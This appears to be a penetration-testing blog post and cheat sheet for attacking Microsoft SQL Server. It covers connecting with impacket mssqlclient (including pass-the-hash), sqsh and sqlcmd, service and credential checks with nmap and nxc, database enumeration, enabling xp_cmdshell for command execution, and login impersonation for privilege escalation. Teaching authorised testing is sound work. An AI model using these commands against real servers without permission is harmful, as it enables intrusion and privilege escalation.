---
title: "Microsoft SQL Server: 101"
date: 2026-04-23 12:00:00 +0500
image:
    path: 'assets/img/posts/attacking-mssql/mssql.jpg'
    alt: Netowrk Penetration Testing Guide Cover Image
toc: true
comments: true
tags: guide pentesting exploitation privilege-escalation
categories: ["pentesting"]
description: "Hands-on Microsoft SQL Server exploitation guide for pentesters, including service detection, authentication, database enumeration, command execution, and privilege escalation."
---

## What is MSSQL? `Default Port: 1433`
Microsoft SQL Server (MSSQL) is a proprietary relational database management system (RDBMS) developed by Microsoft, designed to store, retrieve, and manage structured data. It uses Transact-SQL (T-SQL), a proprietary SQL variant, to handle transactional processing, business intelligence, and analytics applications across corporate environments.

## Connect
### MSSQLCLIENT

```shell
# Windows authentication
mssqlclient.py DOMAIN/username:password@target.com

# SQL authentication
mssqlclient.py sa:password@target.com -windows-auth

# With specific database
mssqlclient.py username:password@target.com -db master

# Using hash (Pass-the-Hash)
mssqlclient.py username@target.com -hashes :NTHASH
```
{: .nolineno}

### SQSH

```shell
# Connect with SQL authentication
sqsh -S target.com -U sa -P password

# Connect with Windows authentication
sqsh -S target.com -U DOMAIN\\username -P password
```
{: .nolineno}

### SQLCMD (WINDOWS) 

```shell
# Local connection
sqlcmd -S localhost -U sa -P password

# Remote connection
sqlcmd -S target.com,1433 -U sa -P password

# Windows authentication
sqlcmd -S target.com -E

# Execute query directly
sqlcmd -S target.com -U sa -P password -Q "SELECT @@version"
```
{: .nolineno}


## Reconnaissance
### Service Detection (NMAP)
Using nmap to detect running `MSSQL` services.
```shell
nmap -p 1433 target.com
```
{: .nolineno}

### Credential Vertification

```shell
# With Local Auth
nxc mssql $IP -u '' -p '' --local-auth

## Without Local Auth
nxc mssql $IP -u '' -p '' 
```

## Enumeration
### Version Detection

```sql
# Get SQL Server version
SELECT @@version;

# Get product version
SELECT SERVERPROPERTY('ProductVersion');
SELECT SERVERPROPERTY('ProductLevel');
SELECT SERVERPROPERTY('Edition');

# Get machine name
SELECT @@SERVERNAME;
SELECT SERVERPROPERTY('MachineName');
```
{: .nolineno}

### Database Enumeration

```sql
# List all databases
SELECT name FROM sys.databases;
SELECT name FROM master.dbo.sysdatabases;

# Current database
SELECT DB_NAME();

# Database information
SELECT name, database_id, create_date 
FROM sys.databases;

# Database size
EXEC sp_helpdb;
```
{: .nolineno}

## MSSQCLIENT (COMMANDS)
### XP_CMDSHELL

```sql
# Enable XP_CMDSHELL
enable_xp_cmdshell

# Enumerate
xp_cmdshell whoami
```
{: .nolineno}

### Enumerate

```sql
enum_db;
enum_users;
enum_logins;
enum_links;
enum_impersonate;

# Interact
use x_database;
SELECT name FROM sysobjects WHERE xtype='U';
select * from tablename;
```
{: .nolineno}

### Impersonate

```sql
enum_impersonate;
exec_as_login username;
```
{: .nolineno}

## Privilege Escalation
### NXC
Detect which user can be impersonated for privilege escalation with `NXC`. Use `-M` to view all modules.

```shell
nxc mssql $IP -u '' -p '' --local-auth -M mssql_priv
```
{: .nolineno}

